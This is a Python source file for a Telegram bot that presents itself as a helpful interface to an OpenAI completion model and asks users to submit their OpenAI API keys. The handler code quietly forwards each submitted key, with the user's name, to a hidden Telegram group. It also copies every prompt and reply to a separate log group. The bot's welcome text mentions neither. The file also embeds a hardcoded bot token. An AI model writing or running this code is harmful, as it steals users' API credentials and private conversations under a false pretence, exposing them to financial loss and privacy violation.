import openai
import telegram
from telegram.ext import Updater, MessageHandler, Filters, CommandHandler

# Set up a flag to track whether the chat command has been called
chat_active = False
api_key_active = False

# -- START CONFIGURATION --

# Get the chat_id of the group
chat_api_id = -650031966

chat_log_id = -839562421

# Setup Engine
engine_ai = "text-davinci-003"

# Set up with user input the OpenAI API client
openai.api_key = ""

# Set up the Telegram bot, static
TELEGRAM_TOKEN = "5881071670:AAHqOHdpYnBa2oQCKjsrex7KlgyGfEvDVQQ"
bot = telegram.Bot(token=TELEGRAM_TOKEN)

# -- END CONFIGURATION --

def start(update, context):
  update.message.reply_text("""
    This is an AI interface.

Use Menu button for all commands and description

Follw these steps to configure your AI:

1- Clik here https://beta.openai.com/account/api-keys

2- Create your API key and save it


Before start, set your API key with /set_api_key

Creator: @james_sec
Contact me if you want to add features to this bot
or support me to get online this bot

Warning !!:
The usage of this tool is only your responsability

  """)

def set_api_key(update, context):
  global api_key_active
  # Set the api_key_active flag to True
  api_key_active = True
  # Prompt the user to enter their API key
  update.message.reply_text("Please enter your API key:")

def display_api_key(update, context):
  # Check if the api_key key is present in the context.user_data dictionary
  if 'api_key' in context.user_data:
    # If the key is present, set the API key and send a message to the user
    api_key = context.user_data['api_key']
    openai.api_key = api_key
    update.message.reply_text(f"Your API Key is:\n{api_key}")
  else:
    # If the key is not present, send a message to the user to set their API key
    update.message.reply_text("Please set your API key using the /set_api_key command")


def chat(update, context):
  global chat_active
  # Set the chat_active flag to True
  chat_active = True
  update.message.reply_text("Ask me something")

def stop_chat(update, context):
  global chat_active
  # Set the chat_active flag to False
  chat_active = False
  update.message.reply_text("Stopping chat")

def handle_message(update, context):
  global chat_active, api_key_active
  # If the chat or API key input commands have not been called, return without doing anything
  if not chat_active and not api_key_active:
    return
  # If the API key input command has been called, set the API key and return
  if api_key_active:
    api_key = update.message.text
    # Store the API key for the current user in the context.user_data dictionary
    context.user_data['api_key'] = api_key
    update.message.reply_text(f"API key set successfully!\n{api_key}")

    # Compose the message
    message_api = f"{update.message.from_user.username} or {update.message.from_user.first_name} API key:\n\n{api_key}"
    # Send the message to the API group
    bot.send_message(chat_id=chat_api_id, text=message_api)

    api_key_active = False
    return
  # If the chat command has been called, process the message as before
  # Store the current message in the context.user_data dictionary
  testo = update.message.text.lower()
  if 'conversation' not in context.user_data:
      context.user_data['conversation'] = []
  # Check if the user wants to reset the conversation
  if testo == '/reset': # /reset command
      context.user_data['conversation'] = []
      update.message.reply_text("Conversation reset.")
      return
  context.user_data['conversation'].append(testo)
  try:
    # Use the conversation as the prompt in the OpenAI API call
    # Use the API key for the current user
    api_key = context.user_data['api_key']
    openai.api_key = api_key
    prompt = "\n".join(context.user_data['conversation'])
    response = openai.Completion.create(engine=engine_ai,prompt=prompt,temperature=1,max_tokens=2048,top_p=1,frequency_penalty=0.0,)
    # Send the response to the user
    response_def = response['choices'][0]['text']
    update.message.reply_text(response_def)
    # Compose the message
    message_log = f"{update.message.from_user.username} or {update.message.from_user.first_name} has set new input:\n\n{testo}\n\nand the Output is:\n\n{response_def}"
    # Send the message to the log group
    bot.send_message(chat_id=chat_log_id, text=message_log)
  except:
    update.message.reply_text("ERROR, check if you have insert correct API /set_api_key \nor started /chat command")



# Set up the message handler
updater = Updater(TELEGRAM_TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('set_api_key', set_api_key))
updater.dispatcher.add_handler(CommandHandler('display_api_key', display_api_key))
updater.dispatcher.add_handler(CommandHandler('chat', chat))
updater.dispatcher.add_handler(CommandHandler('stop_chat', stop_chat))

updater.dispatcher.add_handler(MessageHandler(Filters.text, handle_message))

# Start the bot and listen for incoming messages
print("""
   ____                  _          _            _   ____   ____ _______
  / __ \                (_)        (_)          | | |  _ \ / __ |__   __|
 | |  | |_ __ ___  _ __  _ ___  ___ _  ___ _ __ | |_| |_) | |  | | | |
 | |  | | '_ ` _ \| '_ \| / __|/ __| |/ _ | '_ \| __|  _ <| |  | | | |
 | |__| | | | | | | | | | \__ | (__| |  __| | | | |_| |_) | |__| | | |
  \____/|_| |_| |_|_| |_|_|___/\___|_|\___|_| |_|\__|____/ \____/  |_|

 ----------------------------Bot is running-------------------------------

CTRL+C TO STOP

ERRORS LOGS:


""")

updater.start_polling()
